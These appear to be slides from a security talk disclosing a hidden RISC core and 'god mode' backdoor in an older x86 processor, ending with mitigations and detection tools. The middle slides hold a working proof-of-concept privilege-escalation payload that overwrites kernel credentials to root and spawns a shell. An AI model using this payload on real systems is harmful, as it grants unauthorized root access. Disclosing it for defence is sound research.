0eb8fb64  [ 0000 1110  1011 1000  1111 1011  0110 0100 ]
84d09f36  [ 1000 0100  1101 0000  1001 1111  0011 0110 ]
ea16fea8  [ 1110 1010  0001 0110  1111 1110  1010 1000 ]
==== bin: memory write ====                                                     
4c328b03  [ 0100 1100  0011 0010  1000 1011  0000 0011 ]
5d36cf83  [ 0101 1101  0011 0110  1100 1111  1000 0011 ]
5df788af  [ 0101 1101  1111 0111  1000 1000  1010 1111 ]
9bf3474d  [ 1001 1011  1111 0011  0100 0111  0100 1101 ]
9c15aa0a  [ 1001 1100  0001 0101  1010 1010  0000 1010 ]
9ed314c8  [ 1001 1110  1101 0011  0001 0100  1100 1000 ]
9ed39488  [ 1001 1110  1101 0011  1001 0100  1000 1000 ]
e297738b  [ 1110 0010  1001 0111  0111 0011  1000 1011 ]
e2b3338b  [ 1110 0010  1011 0011  0011 0011  1000 1011 ]
e737980b  [ 1110 0111  0011 0111  1001 1000  0000 1011 ]
e796780b  [ 1110 0111  1001 0110  0111 1000  0000 1011 ]
ec94ee01  [ 1110 1100  1001 0100  1110 1110  0000 0001 ]
ed9458a9  [ 1110 1101  1001 0100  0101 1000  1010 1001 ]
f8b4e96b  [ 1111 1000  1011 0100  1110 1001  0110 1011 ]
A deeply embedded instruction set
 Binning instructions separates out 
different instruction behaviors, 
and reveals the bit patterns 
behind the instruction encoding
A deeply embedded instruction set
lgd: load base address of gdt into register
mov: copy register contents
izx: load 2 byte immediate, zero extended
isx: load 2 byte immediate, sign extended
ra4: shift eax right by 4
la4: shift eax left by 4
ra8: shift eax right by 8
la8: shift eax left by 8
and: bitwise and of two registers, into eax
or:  bitwise or of two registers, into eax
ada: add register to eax
sba: sub register from eax
ld4: load 4 bytes from kernel memory
st4: store 4 bytes into kernel memory
ad4: increment a register by 4
ad2: increment a register by 2
ad1: increment a register by 1
zl3: zero low 3 bytes of register
zl2: zero low 2 bytes of register
zl1: zero low byte of register
cmb: shift low word of source into low word of destination
A deeply embedded instruction set
 Once instructions are binned, 
encodings can be automatically derived 
by analyzing bit patterns within a bin
A deeply embedded instruction set
lgd: [oooooooo....++++........
]
mov: [oooooooo....++++.++++
]
izx: [oooooooo....++++++++++++++++++++]
isx: [oooooooo....++++++++++++++++++++]
ra4: [oooo.......................oooo.]
la4: [oooo.......................oo...]
ra8: [oooo........oooo...........oooo.]
la8: [oooo........................oooo]
and: [ooooooo++++.++++............oooo]
or:  [ooooooo++++.++++............oooo]
ada: [oooooooo
++++
ooo]
sba: [oooooooo
++++
ooo]
ld4: [oooooooo---.++++.++++...==......]
st4: [oooooooo---.++++.++++...==......]
ad4: [ooooooo++++...==
]
ad2: [ooooooo++++...==
]
ad1: [ooooooo++++...==
]
zl3: [ooooooo.
.++++...........]
zl2: [ooooooo.
.++++...........]
zl1: [ooooooo.
.++++...........]
cmb: [oooooooo....++++.++++...........]
[o] opcode  [.] unknown  [ ] don't care
[+] register  [-] offset  [=] length/value
 General patterns:
 Registers encoded with 4 bits
 eax is 0b0000
 ebx is 0b0011
 ecx is 0b0001
 edx is 0b0010
 esi is 0b0110
 edi is 0b0111
 ebp is 0b0101
 esp is 0b0100 
 High bit selects MMX?
 Instructions operate on 0, 1, or 2 explicit registers
 eax sometimes used as an implicit register
 0 to 8 opcode bits at beginning of instruction
 Sometimes more later in the encoding
A deeply embedded instruction set
 The DEIS assembler
 Assembles primitives into their binary representation, 
and wraps each in the x86 bridge instruction
 Payloads for the RISC core 
can now be written in DEIS assembly
A deeply embedded instruction set
The payload
GDT
cred
task_struct
…
fs
…
…
.cred
…
.uid
.gid
.euid
.egid
0  gdt_base = get_gdt_base();
1  descriptor = *(uint64_t*)(gdt_base+KERNEL_SEG);
2  fs_base=((descriptor&0xff00000000000000ULL)>>32)|
3          ((descriptor&0x000000ff00000000ULL)>>16)|
4          ((descriptor&0x00000000ffff0000ULL)>>16);
5  task_struct = *(uint32_t*)(fs_base+OFFSET_TASK_STRUCT);
6  cred = *(uint32_t*)(task_struct+OFFSET_CRED);
7  root = 0
8  *(uint32_t*)(cred+OFFSET_CRED_VAL_UID) = root;
9  *(uint32_t*)(cred+OFFSET_CRED_VAL_GID) = root;
10  *(uint32_t*)(cred+OFFSET_CRED_VAL_EUID) = root;
11  *(uint32_t*)(cred+OFFSET_CRED_VAL_EGID) = root;
The payload
lgd %eax
or  %ebx, %eax
izx $0x4, %ecx
izx $0x5f20, %ecx
ada %ecx
izx $0x78, %edx
izx $0xc133, %edx
st4 %edx, %eax
ada %edx
cmb %ecx, %edx
ada %edx
ada %ecx
ad2 %eax
ld4 %eax, %eax
st4 %edx, %eax
ld4 %eax, %edx
ad2 %eax
izx $0x208, %edx
ada %ecx
ld4 %eax, %ebx
ada %edx
ada %ecx
zl3 %ebx
ld4 %eax, %eax
st4 %edx, %eax
mov %edx, %eax
la8                 izx $0, %edx
ada %ecx
ra8                                        st4 %edx, %eax
The payload
/* unlock the backdoor */
__asm__ ("movl $payload, %eax");
__asm__ (".byte 0x0f, 0x3f");
/* modify kernel memory */
__asm__ ("payload:");
__asm__ ("bound %eax,0xa310075b(,%eax,1)");
__asm__ ("bound %eax,0x24120078(,%eax,1)");
__asm__ ("bound %eax,0x80d2c5d0(,%eax,1)");
__asm__ ("bound %eax,0x0a1af97f(,%eax,1)");
__asm__ ("bound %eax,0xc8109489(,%eax,1)");
__asm__ ("bound %eax,0x0a1af97f(,%eax,1)");
__asm__ ("bound %eax,0xc8109c89(,%eax,1)");
__asm__ ("bound %eax,0xc5e998d7(,%eax,1)");
__asm__ ("bound %eax,0xac128751(,%eax,1)");
__asm__ ("bound %eax,0x844475e0(,%eax,1)");
__asm__ ("bound %eax,0x84245de2(,%eax,1)");
__asm__ ("bound %eax,0x8213e5d5(,%eax,1)");
__asm__ ("bound %eax,0x24115f20(,%eax,1)");
__asm__ ("bound %eax,0x2412c133(,%eax,1)");
__asm__ ("bound %eax,0xa2519433(,%eax,1)");
__asm__ ("bound %eax,0x80d2c5d0(,%eax,1)");
__asm__ ("bound %eax,0xc8108489(,%eax,1)");
__asm__ ("bound %eax,0x24120208(,%eax,1)");
__asm__ ("bound %eax,0x80d2c5d0(,%eax,1)");
__asm__ ("bound %eax,0xc8108489(,%eax,1)");
__asm__ ("bound %eax,0x24120000(,%eax,1)");
__asm__ ("bound %eax,0x24110004(,%eax,1)");
__asm__ ("bound %eax,0x80d1c5d0(,%eax,1)");
__asm__ ("bound %eax,0xe01095fd(,%eax,1)");
__asm__ ("bound %eax,0x80d1c5d0(,%eax,1)");
__asm__ ("bound %eax,0xe01095fd(,%eax,1)");
__asm__ ("bound %eax,0x80d1c5d0(,%eax,1)");
__asm__ ("bound %eax,0x80d1c5d0(,%eax,1)");
__asm__ ("bound %eax,0xe0108dfd(,%eax,1)");
__asm__ ("bound %eax,0x80d1c5d0(,%eax,1)");
__asm__ ("bound %eax,0xe0108dfd(,%eax,1)");
/* launch a shell */
system("/bin/bash");
 (Demo)
Demo
 A secret, co-located core
 Unrestricted access to the x86 core’s register file
 Shared execution pipeline
 But it’s all nebulous this deep
Ring -4 … ?
 Direct ring 3 to ring 0 
hardware privilege escalation on x86.
 This has never been done.
 Fortunately we still need initial ring 0 access!
… right?
 (Demo)
Demo
 Samuel 2 core has the
god mode bit enabled by default.
 Any unprivileged code can 
escalate to the kernel at any time.
 antivirus
 address space protections
 data execution prevention
 code signing
 control flow integrity
 kernel integrity checks
Protections
 Update microcode to
lock down god mode bit
 Update microcode to 
disable ucode assists on the bridge instruction
 Update OS and firmware to disable god mode bit,
and periodically check its status
Mitigations
 Releasing today:
 A tool to check your system
 A tool to protect your system
Mitigations
 This is an old processor, not in widespread use
 The target market is embedded, 
and this is likely a useful feature for customers
Conclusions
 Take this as a case study.
 Back doors exist …
and we can find them.
Conclusions
 Alternative threat scenarios … ?
 Doesn’t impact performance
 Leverages mechanisms already in place
 Virtually impossible to detect
Conclusions
Looking forward
 Open sourced
 Tools, techniques, code, data
 Starting point for future research
project:rosenbridge
project:nightshyft
 (Demo)
project:nightshyft
github.com/xoreaxeaxeax
project:rosenbridge
sandsifter
 M/o/Vfuscator
 REpsych
 x86 0-day PoC
 Etc.
Feedback?  Ideas?
domas
@xoreaxeaxeax
PI:EMAIL